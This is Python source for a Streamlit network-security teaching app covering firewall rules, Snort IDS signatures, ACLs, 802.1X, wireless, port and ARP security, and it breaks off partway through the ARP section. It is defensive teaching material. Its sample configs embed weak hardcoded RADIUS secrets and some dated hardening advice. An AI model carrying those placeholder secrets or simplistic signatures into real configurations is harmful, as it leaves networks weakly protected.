"""
Network Security Lab
Comprehensive network security tools and techniques
"""

import streamlit as st
import pandas as pd
import numpy as np
import plotly.express as px
import plotly.graph_objects as go
from plotly.subplots import make_subplots
import socket
import subprocess
import platform
import json
import time
import hashlib
import random
from datetime import datetime, timedelta
import ipaddress
from typing import Dict, List, Tuple, Optional, Any

def create_lab_header(title: str, icon: str, gradient: str = "linear-gradient(90deg, #667eea 0%, #764ba2 100%)"):
    """Create compact lab header"""
    return f"""
    <div style="background: {gradient}; 
                padding: 0.8rem; border-radius: 6px; margin-bottom: 1rem;">
        <h3 style="color: white; margin: 0; font-size: 1.2rem;">{icon} {title}</h3>
    </div>
    """

def run_lab():
    """Network Security Lab - Protect and Defend Networks"""
    
    # Compact Header
    st.markdown("""
    <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
                padding: 1rem; border-radius: 8px; margin-bottom: 1rem; text-align: center;">
        <h2 style="color: white; margin: 0; font-size: 1.5rem;">
            🔒 Network Security Lab
        </h2>
        <p style="color: white; margin: 0; font-size: 0.9rem; opacity: 0.9;">
            Advanced Network Security Tools & Techniques
        </p>
    </div>
    """, unsafe_allow_html=True)
    
    # Security topics tabs
    tabs = st.tabs([
        "🔥 Firewall",
        "🛡️ IDS/IPS",
        "🔐 Access Control",
        "🌐 NAC",
        "📡 Wireless Security",
        "🔍 Port Security",
        "🎭 ARP Security",
        "🚫 DDoS Protection",
        "🔒 VPN Security",
        "📊 SIEM",
        "🕵️ Penetration Testing",
        "🚨 Incident Response"
    ])
    
    with tabs[0]:
        firewall_lab()
    
    with tabs[1]:
        ids_ips_lab()
    
    with tabs[2]:
        access_control_lab()
    
    with tabs[3]:
        nac_lab()
    
    with tabs[4]:
        wireless_security_lab()
    
    with tabs[5]:
        port_security_lab()
    
    with tabs[6]:
        arp_security_lab()
    
    with tabs[7]:
        ddos_protection_lab()
    
    with tabs[8]:
        vpn_security_lab()
    
    with tabs[9]:
        siem_lab()
    
    with tabs[10]:
        penetration_testing_lab()
    
    with tabs[11]:
        incident_response_lab()

def firewall_lab():
    """Firewall Configuration and Management"""
    
    st.markdown(create_lab_header("Firewall Lab", "🔥", "linear-gradient(90deg, #FF6B6B 0%, #4ECDC4 100%)"), unsafe_allow_html=True)
    
    # Theory Section
    with st.expander("📖 **Firewall Theory**", expanded=True):
        st.markdown("""
        ### 🔥 **Understanding Firewalls**
        
        Firewalls are the first line of defense in network security, controlling traffic flow between 
        network segments based on predetermined security rules.
        
        **Firewall Evolution:**
        - **Gen 1: Packet Filters** - Port/IP based (1988)
        - **Gen 2: Stateful** - Connection tracking (1990s)
        - **Gen 3: Application** - Layer 7 inspection (2000s)
        - **Gen 4: NGFW** - IPS + App control (2010s)
        - **Gen 5: AI-Powered** - ML threat detection (2020s)
        
        **Firewall Types Comparison:**
        
        | Type | OSI Layer | Pros | Cons | Use Case |
        |------|-----------|------|------|----------|
        | Packet Filter | 3-4 | Fast, simple | No state tracking | Basic filtering |
        | Stateful | 3-4 | Connection aware | Limited app visibility | General purpose |
        | Application | 3-7 | Deep inspection | Performance impact | Web applications |
        | NGFW | 3-7 | Complete protection | Complex, expensive | Enterprise |
        
        **Key Features:**
        
        1. **Access Control Lists (ACLs)**
           - Source/destination IP
           - Port numbers
           - Protocols
           - Direction (inbound/outbound)
        
        2. **Stateful Inspection**
           - Connection table
           - TCP state tracking
           - Related connections (FTP)
           - Session timeout
        
        3. **Application Control**
           - Protocol anomaly detection
           - Application identification
           - Content filtering
           - SSL/TLS inspection
        
        **Common Firewall Rules:**
        - **Implicit Deny** - Block all by default
        - **Least Privilege** - Only allow necessary
        - **Defense in Depth** - Multiple layers
        - **Logging** - Record all decisions
        
        **Best Practices:**
        - Place most specific rules first
        - Regular rule review and cleanup
        - Document all rule changes
        - Test rules before production
        - Monitor firewall logs
        - Implement fail-closed mode
        """)
    
    # Firewall Types
    st.markdown("### 🛡️ **Firewall Types**")
    
    fw_type = st.selectbox("Firewall Type:", ["Stateless", "Stateful", "Application", "Next-Gen (NGFW)"])
    
    fw_info = {
        "Stateless": "Packet filtering based on rules, no connection tracking",
        "Stateful": "Tracks connection state, more intelligent decisions",
        "Application": "Layer 7 inspection, application-aware",
        "Next-Gen (NGFW)": "IPS + Application control + User identity + SSL inspection"
    }
    
    st.info(fw_info[fw_type])
    
    # Firewall Rules Builder
    st.markdown("### 📋 **Firewall Rule Builder**")
    
    col1, col2, col3 = st.columns(3)
    
    with col1:
        action = st.selectbox("Action:", ["Permit", "Deny", "Log"])
        protocol = st.selectbox("Protocol:", ["TCP", "UDP", "ICMP", "Any"])
    
    with col2:
        src_ip = st.text_input("Source IP:", "192.168.1.0/24")
        src_port = st.text_input("Source Port:", "any")
    
    with col3:
        dst_ip = st.text_input("Destination IP:", "10.0.0.0/8")
        dst_port = st.text_input("Destination Port:", "80")
    
    if st.button("Generate Rule", key="gen_fw_rule"):
        if fw_type in ["Stateless", "Stateful"]:
            # ACL format
            rule = f"access-list 100 {action.lower()} {protocol.lower()} {src_ip} "
            if src_port != "any":
                rule += f"eq {src_port} "
            rule += f"{dst_ip} "
            if dst_port != "any":
                rule += f"eq {dst_port}"
            
            st.code(rule, language="text")
        
        elif fw_type == "Next-Gen (NGFW)":
            # Palo Alto format
            st.code(f"""
            <entry name="Rule-{random.randint(100, 999)}">
              <from><member>trust</member></from>
              <to><member>untrust</member></to>
              <source><member>{src_ip}</member></source>
              <destination><member>{dst_ip}</member></destination>
              <service><member>{protocol.lower()}-{dst_port}</member></service>
              <application><member>any</member></application>
              <action>{action.lower()}</action>
            </entry>
            """, language="xml")
    
    # Zone-Based Firewall
    st.markdown("### 🌐 **Zone-Based Firewall**")
    
    zones = ["Inside", "Outside", "DMZ"]
    src_zone = st.selectbox("Source Zone:", zones)
    dst_zone = st.selectbox("Destination Zone:", zones)
    
    if src_zone != dst_zone:
        st.code(f"""
        ! Zone definitions
        zone security {src_zone}
        zone security {dst_zone}
        
        ! Zone pair
        zone-pair security {src_zone}-TO-{dst_zone} source {src_zone} destination {dst_zone}
         service-policy type inspect POLICY-{src_zone}-{dst_zone}
        
        ! Policy map
        policy-map type inspect POLICY-{src_zone}-{dst_zone}
         class type inspect HTTP-TRAFFIC
          inspect
         class type inspect ICMP-TRAFFIC
          pass
         class class-default
          drop log
        """, language="text")

def ids_ips_lab():
    """Intrusion Detection and Prevention Systems"""
    
    st.markdown(create_lab_header("IDS/IPS Lab", "🛡️", "linear-gradient(90deg, #667eea 0%, #764ba2 100%)"), unsafe_allow_html=True)
    
    # Theory Section
    with st.expander("📖 **IDS/IPS Theory**", expanded=True):
        st.markdown("""
        ### 🚨 **Understanding IDS/IPS Systems**
        
        Intrusion Detection Systems (IDS) monitor network traffic for suspicious activity and alert administrators, 
        while Intrusion Prevention Systems (IPS) actively block detected threats.
        
        **IDS vs IPS:**
        
        | Aspect | IDS | IPS |
        |--------|-----|-----|
        | Mode | Passive monitoring | Active blocking |
        | Deployment | Out-of-band | Inline |
        | Action | Alert only | Alert + Block |
        | False Positive Impact | Alerts only | Service disruption |
        | Latency | None | Adds latency |
        
        **Detection Methods:**
        
        1. **Signature-Based**
           - Known attack patterns
           - Low false positives
           - Can't detect zero-days
           - Regular updates needed
           - Example: Snort rules
        
        2. **Anomaly-Based**
           - Baseline normal behavior
           - Detects unknown attacks
           - High false positives
           - Learning period required
           - ML/AI powered
        
        3. **Hybrid Approach**
           - Combines both methods
           - Better coverage
           - Complex to manage
        
        **IDS/IPS Placement:**
        - **Network Perimeter** - Internet edge
        - **DMZ** - Between firewalls
        - **Internal Segments** - Lateral movement
        - **Critical Assets** - Database, servers
        
        **Common Attacks Detected:**
        - Port scans and reconnaissance
        - Buffer overflow exploits
        - SQL injection attempts
        - DoS/DDoS attacks
        - Malware communication
        - Data exfiltration
        
        **Evasion Techniques:**
        - Fragmentation
        - Encryption
        - Obfuscation
        - Timing attacks
        - Protocol violations
        
        **Best Practices:**
        - Tune rules to reduce false positives
        - Regular signature updates
        - Monitor IDS/IPS performance
        - Integrate with SIEM
        - Test with penetration testing
        """)
    
    # IDS vs IPS
    system = st.radio("System Type:", ["IDS (Detection)", "IPS (Prevention)"])
    
    if system == "IDS (Detection)":
        st.info("🔍 **Passive monitoring** - Alerts on suspicious activity")
    else:
        st.warning("🚫 **Active blocking** - Prevents malicious traffic")
    
    # Signature-based Detection
    st.markdown("### 📝 **Signature Rules**")
    
    # Snort rule builder
    st.markdown("#### **Snort Rule Builder**")
    
    col1, col2 = st.columns(2)
    
    with col1:
        rule_action = st.selectbox("Action:", ["alert", "log", "drop", "reject"])
        rule_protocol = st.selectbox("Protocol:", ["tcp", "udp", "icmp", "ip"])
        rule_src = st.text_input("Source:", "$HOME_NET")
        rule_src_port = st.text_input("Src Port:", "any")
    
    with col2:
        rule_direction = st.selectbox("Direction:", ["->", "<>"])
        rule_dst = st.text_input("Destination:", "$EXTERNAL_NET")
        rule_dst_port = st.text_input("Dst Port:", "80")
    
    rule_msg = st.text_input("Alert Message:", "Possible SQL Injection")
    rule_content = st.text_input("Content Match:", "SELECT * FROM")
    
    if st.button("Generate Snort Rule", key="gen_snort"):
        rule = f'{rule_action} {rule_protocol} {rule_src} {rule_src_port} {rule_direction} {rule_dst} {rule_dst_port} '
        rule += f'(msg:"{rule_msg}"; '
        if rule_content:
            rule += f'content:"{rule_content}"; nocase; '
        rule += f'sid:{random.randint(1000000, 9999999)}; rev:1;)'
        
        st.code(rule, language="text")
    
    # Attack Patterns
    st.markdown("### 🎯 **Common Attack Patterns**")
    
    attack_type = st.selectbox("Attack Type:", ["Port Scan", "SQL Injection", "XSS", "Buffer Overflow", "DoS"])
    
    attack_signatures = {
        "Port Scan": """
        alert tcp any any -> $HOME_NET any (msg:"Possible Port Scan"; 
        flags:S; threshold:type both, track by_src, count 20, seconds 10; 
        sid:1000001;)
        """,
        "SQL Injection": """
        alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
        msg:"SQL Injection - SELECT statement"; 
        content:"SELECT"; nocase; content:"FROM"; nocase; 
        pcre:"/SELECT.*FROM/i"; sid:1000002;)
        """,
        "XSS": """
        alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
        msg:"XSS Attack - Script Tag"; 
        content:"<script"; nocase; content:"</script>"; nocase; 
        sid:1000003;)
        """,
        "Buffer Overflow": """
        alert tcp any any -> any any (
        msg:"Possible Buffer Overflow - Long String"; 
        content:"|41 41 41 41 41 41 41 41|"; depth:1000; 
        sid:1000004;)
        """,
        "DoS": """
        alert icmp any any -> any any (
        msg:"ICMP Flood"; 
        threshold:type both, track by_src, count 100, seconds 1; 
        sid:1000005;)
        """
    }
    
    if attack_type in attack_signatures:
        st.code(attack_signatures[attack_type], language="text")
    
    # IPS Modes
    st.markdown("### 🔧 **IPS Deployment Modes**")
    
    mode = st.selectbox("Deployment Mode:", ["Inline", "Promiscuous", "Inline-Tap"])
    
    mode_info = {
        "Inline": "Traffic passes through IPS - Can block attacks",
        "Promiscuous": "Receives copy of traffic - Detection only",
        "Inline-Tap": "Inline monitoring without blocking capability"
    }
    
    st.info(mode_info[mode])

def access_control_lab():
    """Network Access Control Lists"""
    
    st.markdown(create_lab_header("Access Control Lab", "🔐", "linear-gradient(90deg, #f093fb 0%, #f5576c 100%)"), unsafe_allow_html=True)
    
    # Theory Section
    with st.expander("📖 **Access Control Theory**", expanded=True):
        st.markdown("""
        ### 🔐 **Understanding Access Control Lists (ACLs)**
        
        ACLs are sequential lists of permit or deny statements that filter network traffic based on 
        specified criteria, providing granular control over data flow.
        
        **Why ACLs?**
        - 🛡️ **Security** - Block unauthorized access
        - 🎯 **Traffic Control** - Filter specific protocols/ports
        - 📊 **QoS** - Classify traffic for prioritization
        - 🔍 **Monitoring** - Log interesting traffic
        
        **ACL Types:**
        
        | Type | OSI Layer | Criteria | Use Case | Performance |
        |------|-----------|----------|----------|-------------|
        | Standard | Layer 3 | Source IP only | Basic filtering | Fast |
        | Extended | Layer 3-4 | Source/Dest IP, Port, Protocol | Granular control | Moderate |
        | Named | Layer 3-4 | Same as Extended + Names | Easy management | Moderate |
        | Reflexive | Layer 4 | Dynamic stateful | Session-based | Slower |
        | Time-based | Layer 3-4 | Time restrictions | Business hours | Moderate |
        
        **ACL Processing:**
        1. **Top-Down** - Sequential evaluation
        2. **First Match** - Stops at first match
        3. **Implicit Deny** - Deny all at end
        4. **No Match** - Proceeds to implicit deny
        
        **Wildcard Masks:**
        - **0.0.0.0** - Match exact IP
        - **0.0.0.255** - Match /24 network
        - **0.0.255.255** - Match /16 network
        - **255.255.255.255** - Match any IP
        
        **ACL Placement:**
        - **Inbound** - Filter before routing
        - **Outbound** - Filter after routing
        - **Standard ACL** - Close to destination
        - **Extended ACL** - Close to source
        
        **Common Mistakes:**
        - Wrong wildcard mask
        - Incorrect ACL order
        - Forgetting implicit deny
        - No return traffic allowed
        - Applied wrong direction
        
        **Best Practices:**
        - Most specific rules first
        - Document each rule
        - Use named ACLs
        - Regular review and cleanup
        - Test before production
        """)
    
    # ACL Types
    st.markdown("### 📋 **ACL Types**")
    
    acl_type = st.selectbox("ACL Type:", ["Standard", "Extended", "Named", "Reflexive", "Time-based"])
    
    if acl_type == "Standard":
        st.markdown("#### **Standard ACL (1-99, 1300-1999)**")
        
        acl_num = st.number_input("ACL Number:", 1, 99, 10)
        
        st.code(f"""
        access-list {acl_num} permit 192.168.1.0 0.0.0.255
        access-list {acl_num} deny 10.0.0.0 0.255.255.255
        access-list {acl_num} permit any
        
        interface GigabitEthernet0/1
         ip access-group {acl_num} in
        """, language="text")
    
    elif acl_type == "Extended":
        st.markdown("#### **Extended ACL (100-199, 2000-2699)**")
        
        st.code("""
        access-list 100 permit tcp 192.168.1.0 0.0.0.255 any eq 80
        access-list 100 permit tcp 192.168.1.0 0.0.0.255 any eq 443
        access-list 100 deny ip 192.168.1.0 0.0.0.255 10.0.0.0 0.255.255.255
        access-list 100 permit ip any any
        
        interface GigabitEthernet0/1
         ip access-group 100 in
        """, language="text")
    
    elif acl_type == "Named":
        acl_name = st.text_input("ACL Name:", "CORP_ACCESS")
        
        st.code(f"""
        ip access-list extended {acl_name}
         permit tcp 192.168.0.0 0.0.255.255 any eq 80
         permit tcp 192.168.0.0 0.0.255.255 any eq 443
         deny tcp any any eq 23
         deny tcp any any eq 21
         permit ip any any
        
        interface GigabitEthernet0/1
         ip access-group {acl_name} in
        """, language="text")
    
    # ACL Best Practices
    st.markdown("### ✅ **ACL Best Practices**")
    
    practices = [
        "Place extended ACLs close to source",
        "Place standard ACLs close to destination",
        "Order matters - most specific first",
        "Remember implicit deny at end",
        "Document ACL purpose",
        "Test before production deployment"
    ]
    
    for practice in practices:
        st.success(f"✓ {practice}")

def nac_lab():
    """Network Access Control (802.1X)"""
    
    st.markdown(create_lab_header("NAC Lab", "🌐", "linear-gradient(90deg, #FA8BFF 0%, #2BD2FF 50%, #2BFF88 100%)"), unsafe_allow_html=True)
    
    # Theory Section
    with st.expander("📖 **NAC Theory**", expanded=True):
        st.markdown("""
        ### 🌐 **Understanding Network Access Control (NAC)**
        
        NAC is a security solution that enforces policy-based access control for devices attempting to 
        access network resources, ensuring only compliant and authorized devices gain access.
        
        **Why NAC?**
        - 🔒 **Zero Trust** - Verify before trust
        - 📱 **BYOD Security** - Control personal devices
        - 🛡️ **Compliance** - Enforce security policies
        - 🔍 **Visibility** - Know what's on your network
        - 🚫 **Threat Prevention** - Block non-compliant devices
        
        **NAC Process:**
        
        1. **Discovery** → Device connects to network
        2. **Authentication** → User/device identity verification
        3. **Posture Assessment** → Check compliance
        4. **Authorization** → Grant appropriate access
        5. **Remediation** → Fix non-compliant devices
        6. **Monitoring** → Continuous compliance checking
        
        **NAC Components:**
        
        | Component | Function | Examples |
        |-----------|----------|----------|
        | Policy Server | Central control | Cisco ISE, Aruba ClearPass |
        | Enforcement Points | Apply policies | Switches, Wireless, VPN |
        | Agents | Device assessment | Persistent, Dissolvable |
        | Guest Portal | Visitor access | Captive portal |
        | RADIUS/TACACS+ | Authentication | AAA services |
        
        **802.1X Authentication:**
        - **Supplicant** - Client device requesting access
        - **Authenticator** - Switch/AP enforcing access
        - **Authentication Server** - RADIUS validating credentials
        
        **Posture Assessment Checks:**
        - **Antivirus** - Updated and running
        - **OS Patches** - Latest security updates
        - **Firewall** - Enabled and configured
        - **Registry** - Security settings
        - **Applications** - Authorized software
        - **Certificates** - Valid device certificates
        
        **Access Control Methods:**
        - **802.1X** - Port-based authentication
        - **MAC Authentication Bypass (MAB)** - For non-802.1X devices
        - **Web Authentication** - Portal-based
        - **VPN** - Remote access control
        
        **Enforcement Actions:**
        - **Allow** - Full network access
        - **Deny** - No network access
        - **Quarantine** - Limited remediation access
        - **Restrict** - Limited network segments
        - **Redirect** - To remediation portal
        
        **Best Practices:**
        - Start with monitoring mode
        - Gradual enforcement rollout
        - Clear remediation process
        - Guest access policies
        - Regular policy updates
        - Integration with SIEM
        """)
    
    # 802.1X Components
    st.markdown("### 🔐 **802.1X Components**")
    
    col1, col2, col3 = st.columns(3)
    
    with col1:
        st.info("**Supplicant**\nClient device requesting access")
    
    with col2:
        st.info("**Authenticator**\nSwitch/AP controlling access")
    
    with col3:
        st.info("**Authentication Server**\nRADIUS server validating credentials")
    
    # 802.1X Configuration
    st.markdown("### ⚙️ **802.1X Configuration**")
    
    device = st.selectbox("Device Type:", ["Switch", "Wireless Controller"])
    
    if device == "Switch":
        st.code("""
        ! Global Configuration
        aaa new-model
        aaa authentication dot1x default group radius
        dot1x system-auth-control
        
        ! RADIUS Server
        radius server ISE
         address ipv4 192.168.1.100 auth-port 1812 acct-port 1813
         key RadiusSecret123
        
        ! Interface Configuration
        interface GigabitEthernet0/1
         switchport mode access
         switchport access vlan 10
         authentication port-control auto
         dot1x pae authenticator
         dot1x timeout tx-period 10
         dot1x max-req 2
        
        ! Guest VLAN
        interface GigabitEthernet0/1
         authentication event fail action authorize vlan 999
         authentication event no-response action authorize vlan 999
        """, language="text")
    
    # MAB (MAC Authentication Bypass)
    st.markdown("### 📱 **MAB Configuration**")
    
    st.code("""
    interface GigabitEthernet0/1
     authentication order dot1x mab
     authentication priority dot1x mab
     mab
    
    ! For devices that don't support 802.1X
    ! MAC address authenticated against RADIUS
    """, language="text")
    
    # Dynamic VLAN Assignment
    st.markdown("### 🏷️ **Dynamic VLAN Assignment**")
    
    st.code("""
    ! RADIUS Attributes for VLAN Assignment
    Tunnel-Type = VLAN
    Tunnel-Medium-Type = IEEE-802
    Tunnel-Private-Group-ID = 100
    
    ! Switch accepts VLAN from RADIUS
    interface GigabitEthernet0/1
     authentication event server alive action reinitialize
     authentication host-mode multi-domain
    """, language="text")

def wireless_security_lab():
    """Wireless Network Security"""
    
    st.markdown(create_lab_header("Wireless Security Lab", "📡", "linear-gradient(90deg, #00C9FF 0%, #92FE9D 100%)"), unsafe_allow_html=True)
    
    # Theory Section
    with st.expander("📖 **Wireless Security Theory**", expanded=True):
        st.markdown("""
        ### 📡 **Understanding Wireless Security**
        
        Wireless networks face unique security challenges due to their broadcast nature, making proper 
        security controls essential to prevent unauthorized access and data interception.
        
        **Wireless Security Evolution:**
        - **Open** - No security (Never use!)
        - **WEP** - Broken, 24-bit IV (Deprecated)
        - **WPA** - TKIP, 48-bit IV (Legacy)
        - **WPA2** - AES-CCMP (Current standard)
        - **WPA3** - SAE, PFS (Latest standard)
        
        **Security Standards Comparison:**
        
        | Standard | Encryption | Authentication | Vulnerabilities | Use Case |
        |----------|------------|----------------|-----------------|----------|
        | WEP | RC4 | Shared Key | Easily cracked | Never |
        | WPA | TKIP/RC4 | PSK/802.1X | KRACK attacks | Legacy only |
        | WPA2 | AES-CCMP | PSK/802.1X | KRACK, Dictionary | Current |
        | WPA3 | AES-GCMP | SAE/802.1X | Limited | Recommended |
        
        **Common Wireless Attacks:**
        
        1. **Evil Twin**
           - Fake AP with same SSID
           - Man-in-the-middle position
           - Credential harvesting
        
        2. **Deauthentication**
           - Force client disconnection
           - Capture handshake
           - DoS attack
        
        3. **WPS Attacks**
           - Brute force PIN
           - Pixie dust attack
           - 11,000 combinations only
        
        4. **KRACK Attack**
           - Key Reinstallation
           - WPA2 vulnerability
           - Decrypt traffic
        
        **Wireless Security Features:**
        - **PMF** - Protected Management Frames
        - **OWE** - Opportunistic Wireless Encryption
        - **SAE** - Simultaneous Authentication of Equals
        - **Forward Secrecy** - Past sessions secure
        
        **Enterprise vs Personal:**
        
        | Feature | Personal (PSK) | Enterprise (802.1X) |
        |---------|---------------|-------------------|
        | Key Management | Single shared | Per-user keys |
        | Authentication | Password only | Username + Password |
        | Scalability | Small networks | Large networks |
        | Accounting | None | Full logging |
        | Complexity | Simple | Complex |
        
        **Best Practices:**
        - Use WPA3 where possible
        - Strong, unique passwords
        - Disable WPS
        - Hide SSID (defense in depth)
        - MAC filtering (additional layer)
        - Regular firmware updates
        - Separate guest networks
        - Monitor for rogue APs
        """)
    
    # Encryption Standards
    st.markdown("### 🔒 **Wireless Encryption**")
    
    encryption = st.selectbox("Encryption Standard:", ["WEP", "WPA", "WPA2", "WPA3"])
    
    encryption_info = {
        "WEP": {
            "Security": "❌ Weak - Deprecated",
            "Encryption": "RC4",
            "Key Length": "40/104 bits",
            "Authentication": "Open/Shared Key"
        },
        "WPA": {
            "Security": "⚠️ Better - Legacy",
            "Encryption": "TKIP with RC4",
            "Key Length": "128 bits",
            "Authentication": "PSK/Enterprise"
        },
        "WPA2": {
            "Security": "✅ Strong - Current Standard",
            "Encryption": "AES-CCMP",
            "Key Length": "128 bits",
            "Authentication": "PSK/Enterprise"
        },
        "WPA3": {
            "Security": "✅✅ Strongest - Latest",
            "Encryption": "AES-GCMP-256",
            "Key Length": "192/256 bits",
            "Authentication": "SAE/Enterprise"
        }
    }
    
    info = encryption_info[encryption]
    for key, value in info.items():
        st.info(f"**{key}:** {value}")
    
    # WPA2 Enterprise
    st.markdown("### 🏢 **WPA2-Enterprise Configuration**")
    
    st.code("""
    ! Wireless LAN Controller Configuration
    
    config wlan security wpa enable 1
    config wlan security wpa wpa2 enable 1
    config wlan security wpa wpa2 ciphers aes enable 1
    config wlan security wpa akm 802.1x enable 1
    
    ! RADIUS Configuration
    config radius auth add 1 192.168.1.100 1812 ascii RadiusKey123
    config radius acct add 1 192.168.1.100 1813 ascii RadiusKey123
    
    ! EAP Methods
    config wlan security eap-params enable fast 1
    config wlan security eap-params enable peap 1
    config wlan security eap-params enable tls 1
    """, language="text")
    
    # Rogue AP Detection
    st.markdown("### 🚨 **Rogue AP Detection**")
    
    detection_method = st.selectbox("Detection Method:", ["WIDS", "Manual Scanning", "Client Reports"])
    
    if detection_method == "WIDS":
        st.code("""
        ! Cisco WLC Rogue Detection
        config rogue detection enable
        config rogue detection monitor-mode enable
        config rogue auto-contain level 3
        
        ! Rogue Classification Rules
        config rogue rule add priority 1 rule1
        config rogue rule condition add rule1 ssid Corporate-Fake
        config rogue rule action add rule1 contain
        
        ! Alert Configuration
        config rogue detection report-interval 30
        config rogue detection min-rssi -70
        """, language="text")

def port_security_lab():
    """Switch Port Security"""
    
    st.markdown(create_lab_header("Port Security Lab", "🔍", "linear-gradient(90deg, #FC466B 0%, #3F5EFB 100%)"), unsafe_allow_html=True)
    
    # Theory Section
    with st.expander("📖 **Port Security Theory**", expanded=True):
        st.markdown("""
        ### 🔍 **Understanding Port Security**
        
        Port security is a Layer 2 security feature that restricts input to an interface by limiting and 
        identifying MAC addresses allowed to access the port, preventing unauthorized devices.
        
        **Why Port Security?**
        - 🚫 **MAC Flooding Prevention** - Stop CAM table overflow
        - 🔒 **Unauthorized Access** - Block rogue devices
        - 📍 **Device Tracking** - Know what connects where
        - 🛡️ **Layer 2 Protection** - First line of defense
        - 📊 **Compliance** - Meet security requirements
        
        **Port Security Features:**
        
        1. **MAC Address Limiting**
           - Maximum allowed MACs per port
           - Static or dynamic learning
           - Aging timer for dynamic MACs
        
        2. **Sticky MAC Learning**
           - Dynamically learn and save
           - Converts to static entries
           - Survives reboot
        
        3. **Violation Modes:**
        
        | Mode | Action | Syslog | SNMP Trap | Counter | Port State |
        |------|--------|--------|-----------|---------|------------|
        | Shutdown | Err-disable | Yes | Yes | Yes | Down |
        | Restrict | Drop frames | Yes | Yes | Yes | Up |
        | Protect | Drop frames | No | No | No | Up |
        
        **Common Attacks Prevented:**
        - **CAM Table Overflow** - MAC flooding attack
        - **MAC Spoofing** - Impersonation
        - **DHCP Starvation** - Resource exhaustion
        - **Unauthorized Devices** - Rogue connections
        
        **Port Security Configuration:**
        ```
        switchport port-security
        switchport port-security maximum [1-8192]
        switchport port-security mac-address [MAC/sticky]
        switchport port-security violation [mode]
        switchport port-security aging time [minutes]
        ```
        
        **DHCP Snooping Integration:**
        - Builds binding table
        - Tracks IP-MAC-Port mappings
        - Prevents DHCP attacks
        - Foundation for DAI and IP Source Guard
        
        **Dynamic ARP Inspection (DAI):**
        - Validates ARP packets
        - Uses DHCP snooping database
        - Prevents ARP spoofing
        - Rate limiting capability
        
        **IP Source Guard:**
        - Filters IP traffic
        - Validates source IP
        - Uses DHCP snooping binding
        - Prevents IP spoofing
        
        **Best Practices:**
        - Start with low MAC limits
        - Use sticky learning for static devices
        - Restrict mode for critical ports
        - Monitor violation logs
        - Document MAC addresses
        - Regular security audits
        """)
    
    # Port Security Configuration
    st.markdown("### 🔐 **Port Security Configuration**")
    
    col1, col2 = st.columns(2)
    
    with col1:
        max_mac = st.number_input("Maximum MAC Addresses:", 1, 10, 2)
        violation_mode = st.selectbox("Violation Mode:", ["Shutdown", "Restrict", "Protect"])
    
    with col2:
        sticky = st.checkbox("Sticky MAC Learning", value=True)
        aging = st.number_input("Aging Time (min):", 0, 1440, 0)
    
    config = f"""
    interface GigabitEthernet0/1
     switchport mode access
     switchport port-security
     switchport port-security maximum {max_mac}
     switchport port-security violation {violation_mode.lower()}
    """
    
    if sticky:
        config += " switchport port-security mac-address sticky\n"
    
    if aging > 0:
        config += f" switchport port-security aging time {aging}\n"
        config += " switchport port-security aging type inactivity\n"
    
    st.code(config, language="text")
    
    # Violation Actions
    st.markdown("### ⚠️ **Violation Actions Explained**")
    
    actions = {
        "Shutdown": "Port enters error-disabled state, requires manual intervention",
        "Restrict": "Drops packets, sends SNMP trap, increments violation counter",
        "Protect": "Drops packets silently, no alerts"
    }
    
    for action, description in actions.items():
        if action == violation_mode:
            st.success(f"**{action}:** {description}")
        else:
            st.info(f"**{action}:** {description}")
    
    # DHCP Snooping
    st.markdown("### 🛡️ **DHCP Snooping**")
    
    st.code("""
    ! Global Configuration
    ip dhcp snooping
    ip dhcp snooping vlan 10,20,30
    
    ! Trusted Interface (Uplink to DHCP Server)
    interface GigabitEthernet0/24
     ip dhcp snooping trust
    
    ! Untrusted Interface (Client Ports)
    interface range GigabitEthernet0/1-23
     ip dhcp snooping limit rate 10
    
    ! Verification
    show ip dhcp snooping
    show ip dhcp snooping binding
    """, language="text")

def arp_security_lab():
    """ARP Security and DAI"""
    
    st.markdown(create_lab_header("ARP Security Lab", "🎭", "linear-gradient(90deg, #f093fb 0%, #f5576c 100%)"), unsafe_allow_html=True)
    
    # Theory Section
    with st.expander("📖 **ARP Security Theory**", expanded=True):
        st.markdown("""
        ### 🎭 **Understanding ARP Security**
        
        Address Resolution Protocol (ARP) maps IP addresses to MAC addresses but lacks authentication, 
        making it vulnerable to various attacks that can compromise network security.
        
        **ARP Vulnerabilities:**
        - 🔓 **No Authentication** - Anyone can send ARP replies
        - 📢 **Broadcast Nature** - All devices receive ARP requests
        - 💾 **Cache Poisoning** - Fake entries accepted
        - 🔄 **Stateless Protocol** - No verification mechanism
        
        **Common ARP Attacks:**
        
        1. **ARP Spoofing/Poisoning**
           - Send fake ARP replies
           - Redirect traffic through attacker
           - Man-in-the-middle position
           - Sniff or modify traffic
        
        2. **ARP Cache Poisoning**
           - Corrupt ARP tables
           - Associate attacker MAC with gateway IP
           - Intercept all external traffic
        
        3. **Gratuitous ARP Attack**
           - Unsolicited ARP replies
           - Update all device caches
           - Claim IP addresses
        
        4. **ARP Flooding**
           - Overwhelm switch CAM table
           - Force hub mode
           - Sniff all traffic
        
        **Attack Impact:**
        - 🔍 **Traffic Interception** - Read sensitive data
        - 🔄 **Session Hijacking** - Take over connections
        - 🚫 **Denial of Service** - Disrupt connectivity
        - 🎭 **Identity Theft** - Impersonate devices
        
        **Defense Mechanisms:**
        
        | Defense | Method | Effectiveness | Complexity |
        |---------|--------|--------------|------------|
        | Static ARP | Manual entries | High | High maintenance |
        | DAI | Dynamic validation | Very High | Medium |
        | Private VLANs | Isolation | Medium | Low |
        | ARP Rate Limiting | Throttle ARP | Medium | Low |
        | Port Security | MAC binding | Medium | Medium |
        
        **Dynamic ARP Inspection (DAI):**
        - Validates ARP packets
        - Uses DHCP snooping database
        - Drops invalid ARP packets
        - Rate limits ARP traffic
        - Logs violations
        
        **DAI Configuration:**
        ```
        ip arp inspection vlan 10
        ip arp inspection validate src-mac dst-mac ip
        ip arp inspection limit rate 15
        interface trusted
         ip arp inspection trust
        ```
        
        **Best Practices:**
        - Enable DHCP snooping first
        - Configure DAI on all VLANs
        - Trust only infrastructure ports
        - Monitor ARP inspection logs
        - Use static ARP for critical servers
        - Implement port security
        - Regular security audits
        """)
    
    # ARP Attacks
    st.markdown("### 🚨 **ARP Attack Types**")
    
    attack = st.selectbox("Attack Type:", ["ARP Spoofing", "ARP Cache Poisoning", "Gratuitous ARP"])
    
    attack_info = {
        "ARP Spoofing": "Attacker sends fake ARP messages to associate their MAC with legitimate IP",
        "ARP Cache Poisoning": "Corrupting ARP cache with false MAC-IP mappings",
